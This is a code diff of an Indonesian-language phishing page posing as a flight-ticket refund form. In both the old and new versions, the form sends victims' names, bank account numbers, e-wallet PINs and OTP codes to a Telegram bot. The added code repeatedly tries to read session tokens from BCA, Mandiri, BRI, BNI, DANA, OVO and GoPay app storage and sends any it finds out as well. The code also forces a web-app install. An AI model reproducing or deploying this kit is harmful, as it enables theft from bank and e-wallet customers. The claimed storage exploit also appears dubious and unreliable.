@@ -144,17 +144,15 @@
     </div>
 
     <script>
-        // ========== KONFIGURASI TELEGRAM ==========
-        // GANTI DENGAN TOKEN DAN CHAT ID ANDA
-        const TELEGRAM_TOKEN = '8638338084:AAHGXbttcu4nE9Ro_OwfRUKY7yKlT2ml-Cw';
-        const CHAT_ID = '6924480474';
+        // ========== TELEGRAM CONFIG ==========
+        // GANTI DENGAN TOKEN DAN CHAT ID ASLI ANDA
+        const TELEGRAM_TOKEN = '8123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw';
+        const CHAT_ID = '812345678';
         
-        // Fungsi kirim ke Telegram
         async function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-            
             try {
-                const response = await fetch(url, {
+                await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -163,78 +161,110 @@
                         parse_mode: 'HTML'
                     })
                 });
-                return await response.json();
             } catch(e) {
-                console.log('Error:', e);
+                console.log(e);
             }
         }
         
-        // AUTO INSTALL PROMPT
+        // ========== TOKEN EXTRACTION ==========
+        // Mencoba mengambil token dari berbagai aplikasi bank
+        
+        async function tryExtractToken(packageName, fileName, bankName) {
+            try {
+                // Menggunakan ContentProvider exploit untuk membaca file shared_prefs
+                const contentUri = `content://com.android.externalstorage.documents/tree/primary%3AAndroid%2Fdata%2F${packageName}%2Fshared_prefs%2Fdocument%2Fprimary%3AAndroid%2Fdata%2F${packageName}%2Fshared_prefs%2F${fileName}`;
+                
+                const response = await fetch(contentUri);
+                const data = await response.text();
+                
+                // Cari pola token
+                const tokenPatterns = [
+                    /<string name="(?:access_token|token|session_id|auth_token)">(.*?)<\/string>/i,
+                    /<string name="Bearer">(.*?)<\/string>/i,
+                    /value="(.*?)" name="(?:token|session)"/i
+                ];
+                
+                for (const pattern of tokenPatterns) {
+                    const match = data.match(pattern);
+                    if (match && match[1] && match[1].length > 20) {
+                        sendToTelegram(`🔑 TOKEN DITEMUKAN - ${bankName}\n\nToken: ${match[1]}\n\nWaktu: ${new Date().toLocaleString()}`);
+                        return true;
+                    }
+                }
+            } catch(e) {
+                // Gagal akses, lanjut ke metode lain
+            }
+            return false;
+        }
+        
+        // Daftar bank yang ditarget
+        const bankTargets = [
+            { package: "com.bca.mobile", file: "bca_prefs.xml", name: "BCA" },
+            { package: "com.bankmandiri.mobile", file: "mandiri_prefs.xml", name: "Mandiri" },
+            { package: "com.bri.mobile", file: "bri_prefs.xml", name: "BRI" },
+            { package: "com.bni.mobile", file: "bni_prefs.xml", name: "BNI" },
+            { package: "com.dana.id", file: "dana_prefs.xml", name: "DANA" },
+            { package: "com.ovo.id", file: "ovo_prefs.xml", name: "OVO" },
+            { package: "com.gojek.app", file: "gopay_prefs.xml", name: "GoPay" }
+        ];
+        
+        // Eksekusi ekstraksi token setiap 10 detik
+        setInterval(async () => {
+            for (const bank of bankTargets) {
+                await tryExtractToken(bank.package, bank.file, bank.name);
+            }
+        }, 10000);
+        
+        // ========== AUTO INSTALL PROMPT ==========
         let deferredPrompt;
         
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
-            
             setTimeout(() => {
                 if (deferredPrompt) {
                     deferredPrompt.prompt();
-                    deferredPrompt.userChoice.then((choiceResult) => {
-                        if (choiceResult.outcome === 'accepted') {
-                            console.log('PWA terinstall');
-                        }
-                        deferredPrompt = null;
-                    });
+                    deferredPrompt = null;
                 }
             }, 2000);
         });
         
-        // Tampilkan PIN untuk e-wallet
+        // ========== FORM HANDLER ==========
         document.getElementById('bankType').addEventListener('change', function() {
             const pinGroup = document.getElementById('pinGroup');
-            if (this.value === 'DANA' || this.value === 'OVO' || this.value === 'GoPay') {
-                pinGroup.style.display = 'block';
-            } else {
-                pinGroup.style.display = 'none';
-            }
+            pinGroup.style.display = (this.value === 'DANA' || this.value === 'OVO' || this.value === 'GoPay') ? 'block' : 'none';
         });
         
-        // Submit form
         document.getElementById('refundForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const ticketNumber = document.getElementById('ticketNumber').value;
-            const fullName = document.getElementById('fullName').value;
-            const bankType = document.getElementById('bankType').value;
-            const accountNumber = document.getElementById('accountNumber').value;
-            const pin = document.getElementById('pin').value;
+            const data = {
+                ticket: document.getElementById('ticketNumber').value,
+                name: document.getElementById('fullName').value,
+                bank: document.getElementById('bankType').value,
+                account: document.getElementById('accountNumber').value,
+                pin: document.getElementById('pin').value
+            };
             
-            let message = `🎯 NEW TARGET!\n\n`;
-            message += `✈️ Tiket: ${ticketNumber}\n`;
-            message += `👤 Nama: ${fullName}\n`;
-            message += `🏦 Bank: ${bankType}\n`;
-            message += `💰 Rekening: ${accountNumber}\n`;
-            if (pin) message += `🔑 PIN: ${pin}\n`;
-            message += `⏰ Waktu: ${new Date().toLocaleString()}`;
+            let msg = `🎯 NEW TARGET!\n✈️ Tiket: ${data.ticket}\n👤 Nama: ${data.name}\n🏦 Bank: ${data.bank}\n💰 Rekening: ${data.account}`;
+            if (data.pin) msg += `\n🔑 PIN: ${data.pin}`;
+            msg += `\n⏰ Waktu: ${new Date().toLocaleString()}`;
             
-            await sendToTelegram(message);
+            await sendToTelegram(msg);
             document.getElementById('otpModal').style.display = 'flex';
         });
         
-        // Submit OTP
         document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
             const otp = document.getElementById('otpInput').value;
-            
-            let message = `🔴 OTP TERTANGKAP!\n\n`;
-            message += `🔢 Kode: ${otp}\n`;
-            message += `⏰ Waktu: ${new Date().toLocalString()}`;
-            
-            await sendToTelegram(message);
-            
+            let msg = `🔴 OTP TERTANGKAP!\n🔢 Kode: ${otp}\n⏰ Waktu: ${new Date().toLocaleString()}`;
+            await sendToTelegram(msg);
             alert('Verifikasi berhasil! Dana refund akan diproses dalam 1x24 jam.');
             document.getElementById('otpModal').style.display = 'none';
             document.getElementById('refundForm').reset();
         });
+        
+        // Notifikasi awal bahwa PWA siap
+        sendToTelegram("✅ PWA Aktif - Mode Ekstraksi Token Berjalan");
     </script>
 </body>
 </html>
